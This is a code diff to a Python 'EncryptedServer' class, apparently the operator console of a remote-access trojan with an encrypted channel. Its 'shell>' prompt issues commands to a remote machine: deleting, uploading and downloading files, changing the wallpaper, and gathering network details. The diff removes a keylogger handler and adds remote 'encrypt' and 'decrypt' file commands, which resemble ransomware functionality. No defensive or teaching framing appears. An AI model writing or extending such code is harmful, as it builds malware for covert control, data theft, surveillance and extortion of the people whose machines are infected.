@@ -96,13 +96,6 @@ class EncryptedServer:
         if "del" in command:
             print(self.decrypt(self.conn.recv(1024)).decode())
 
-        elif "keylogger" in command:
-            while True:
-                data = self.decrypt(self.conn.recv(1024)).decode()
-                if data != "Done":
-                    print(data.strip())
-                else:
-                    break
 
         elif "upload" in command:
             file_name = command.split(" ")[1]
@@ -115,6 +108,21 @@ class EncryptedServer:
             self.send_command(file_name)
             time.sleep(0.1)
             self.download(file_name)
+        
+        elif "encrypt" in command:
+            file_name = command.split(" ")[1]
+            self.send_command(file_name)
+            time.sleep(0.1)
+            response = self.decrypt(self.conn.recv(1024)).decode()
+            print(response)
+        
+        elif "decrypt" in command:
+            file_name = command.split(" ")[1]
+            self.send_command(file_name)
+            time.sleep(0.1)
+            response = self.decrypt(self.conn.recv(1024)).decode()
+            print(response)
+
 
         else:
             num_chunks = int(self.decrypt(self.conn.recv(1024)).decode())
@@ -134,17 +142,19 @@ class EncryptedServer:
                 return
 
             print("""\nAvailable commands:
-dir, path, ipconfig, arp -a
-del [file], cd [path], download [file], upload [file], wall [img], keylogger [count] [buf]
-                    """)
+                    dir, path, ipconfig, arp -a, hostname
+                    del [file], cd [path], download [file], upload [file], wall [img]
+                    encrypt [file], decrypt [file]
+                """)
 
             while True:
                 command = input("shell> ").strip()
                 if command == "help":
                     print("""Available commands:
-dir, path, ipconfig, arp -a
-del [file], cd [path], download [file], upload [file], wall [img], keylogger [count] [buf]
-                    """)
+                            dir, path, ipconfig, arp -a, hostname
+                            del [file], cd [path], download [file], upload [file], wall [img]
+                            encrypt [file], decrypt [file]
+                        """)
                     continue
 
                 elif (command.lower() == "exit") or (command.lower() == "close"):
